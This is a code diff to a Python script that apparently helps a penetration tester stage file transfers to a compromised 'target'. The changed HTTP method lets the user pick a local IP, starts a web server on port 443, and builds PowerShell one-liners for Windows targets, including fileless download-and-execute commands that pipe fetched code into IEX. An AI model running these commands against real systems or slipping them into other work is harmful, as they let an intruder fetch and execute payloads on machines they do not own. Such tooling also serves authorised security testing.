@@ -7,7 +7,7 @@ import subprocess
 import random
 import hashlib
 import string
-import netifaces
+import netifaces as ni
 import time
 
 # RUN COMMONLY USED COMMANDS
@@ -74,54 +74,73 @@ def transfer_to(args):
 
     # PYTHON HTTP SERVER METHOD
     if args.method == 'http':
-        print('\033[1m[?] What IP address to listen on? ', end='')
-        print('\033[0m')
-        try:
-            listen_ip = input()
-        except KeyboardInterrupt:
-            sys.exit(0)
-        print('\033[1m[+] Starting HTTP server on 0.0.0.0 port 443 ...\033[0m')
+        # SELECT IP ADDRESS TO LISTEN TO
+        ip_list = []
+        for interface in ni.interfaces():
+            ipv4 = ni.ifaddresses(interface)
+            if ni.AF_INET in ipv4.keys():
+                ip_list.append(ipv4[ni.AF_INET][0]['addr'])
+        while True:
+            print('[?] What IP address to listen on? ')
+            i = 1
+            for ip in ip_list:
+                print('      ' + str(i) + ') ' + ip)
+                i += 1
+            print('[?] CHOICE: ', end='')
+            try:
+                choice = input()
+            except KeyboardInterrupt:
+                sys.exit(0)
+            if int(choice) <= len(ip_list):
+                listen_ip = ip_list[int(choice)-1]
+                break
+            else:
+                print('Invalid choice. Try again.')
+
+        # START PYTHON HTTP SERVER
+        print('[+] Starting HTTP server on ' + listen_ip + ' port 443 ...')
         try:
             pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except KeyboardInterrupt:
             sys.exit(0)
         except:
-            print('\033[1m[!] Failed to start HTTP server\033[0m')
+            print('[!] Failed to start HTTP server')
             sys.exit(1)
         
         print('[+] Run this command on target')
         if args.os == 'windows':
-            print('\033[1m[+] Select method:')
+            print('[+] Select method:')
             print('      1. DownloadFile')
             print('      2. DownloadString - Fileless')
             print('      3. Invoke-WebRequest')
             print('      4. Invoke-WebRequest - Fileless')
             print('[?] CHOICE: ', end='')
-            print('\033[0m')
-            choice = input()
+            try:
+                choice = input()
+            except KeyboardInterrupt:
+                sys.exit(0)
 
             if choice == '':
                 choice = '1'
-                print('\033[1m[+] DownloadFile method selected\033[0m')
+                print('[+] DownloadFile method selected')
 
             if choice == '1':
-                print('\033[1m[+] DownloadFile method selected\033[0m')
-                print('\033[1m[?] Sync or Async? ', end='')
-                print('\033[0m')
+                print('[+] DownloadFile method selected')
+                print('[?] Sync or Async? ', end='')
+                print('')
                 sync = input().lower()
                 if sync == '':
                     sync = 'sync'
-                    print('\033[1m[+] Using synchronous DownloadFile\033[0m')
                 if sync == 'async':
-                    print('\033[1m[+] Using asynchronous DownloadFile\033[0m')
+                    print('[+] Using Asynchronous DownloadFile')
                     startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
                 elif sync == 'sync':
-                    print('[+] Using synchronous DownloadFile')
+                    print('[+] Using Synchronous DownloadFile')
                     startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
             elif choice == '2':
-                print('\033[1m[+] DownloadString - Fileless method selected\033[0m')
+                print('[+] DownloadString - Fileless method selected')
                 choice = random.randint(1, 2)
                 if choice == '1':
                     startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename + '\')'
@@ -130,11 +149,11 @@ def transfer_to(args):
                     startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
                     endcmd = '\') | IEX'
             elif choice == '3':
-                print('\033[1m[+] Invoke-WebRequest method selected\033[0m')
+                print('[+] Invoke-WebRequest method selected')
                 startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                 endcmd = ' -OutFile ' + rand_filename
             elif choice == '4':
-                print('\033[1m[+] Invoke-WebRequest - Fileless method selected\033[0m')
+                print('[+] Invoke-WebRequest - Fileless method selected')
                 startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                 endcmd = ' | IEX'
             else:
